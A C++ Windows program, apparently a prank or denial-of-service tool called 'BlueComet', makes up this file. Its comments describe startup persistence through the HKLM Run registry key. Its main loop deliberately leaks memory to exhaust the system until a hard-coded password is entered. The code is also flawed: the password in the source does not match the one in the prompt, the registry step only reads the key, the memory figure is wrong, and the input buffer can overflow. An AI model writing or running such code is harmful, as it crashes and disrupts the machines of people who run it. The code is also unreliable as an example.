/*@@@  @@@   @@@@@@   @@@@@@@    @@@@@@    @@@@@@   */
/*@@@  @@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  */
/*@@!  !@@  @@!  @@@  @@!  @@@  @@!  @@@  @@!  @@@  */
/*!@!  @!!  !@!  @!@  !@!  @!@  !@!  @!@  !@!  @!@  */
/*@!@@!@!   @!@!@!@!  @!@@!@!   @!@  !@!  @!@  !@!  */
/*!!@!!!    !!!@!!!!  !!@!!!    !@!  !!!  !@!  !!!  */
/*!!: :!!   !!:  !!!  !!:       !!:  !!!  !!:  !!!  */
/*:!:  !:!  :!:  !:!  :!:       :!:  !:!  :!:  !:!  */
/* ::  :::  ::   :::   ::       ::::: ::  ::::: ::  */
/* :   :::   :   : :   :         : :  :    : :  :   */


#include <iostream>
#include <string>
#include <cstring>
#include <cstdlib>
#include <Windows.h>
#pragma comment(lib, "Advapi32.lib")

using namespace std; /*Used to display counter and password simultaneously*/

int main() {
    /* Create registry to include BlueComet in startup on all local machines */
    char re[MAX_PATH];
    string FP = string(re, GetModuleFileName(NULL, re, MAX_PATH));

    LONG ln = RegGetValueA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "BlueComet", RRF_RT_REG_SZ, 0, 0, 0);

    /* Password to stop memory crash is P@thf1nder */
    const char password[] = {'P', '@', 't', 'h', 'f', '1', 'n', 'd', 'e', 'r', '\0'};
    char input[11];
    bool stopProgram = false;
    int loopCount = 0;

    while (!stopProgram) {
        for (int j = 0; j < 1024 * 1024; j++) { // add 1 MB of binary for each loop j
            char* buffer = new char[1024 * 1024]; // allocate 1 MB of memory
            memset(buffer, rand() % 256, 1024 * 1024); // fill with random binary
        }
	/*Pull Current Memory Status*/
        MEMORYSTATUSEX status;
        status.dwLength = sizeof(status);
        GlobalMemoryStatusEx(&status);
        cout << "Dumping 1MB Binary to Memory " << loopCount << " iterations completed. " << status.ullTotalPhys / (1024 * 1024) << " MB of memory remaining." << endl;
        loopCount++;
	/*Enter Password: Pathf1nder to stop. Remove BlueComet from registry to remove program.*/
        cout << "Enter password P@thF1nder to stop the program: ";
        cin >> input;
        if (strcmp(input, password) == 0) {
            cout << "Password correct. Stopping program. Remove BlueComet from memory or this will happen again." << endl;
            stopProgram = true;
        }
    }
    return 0;
}
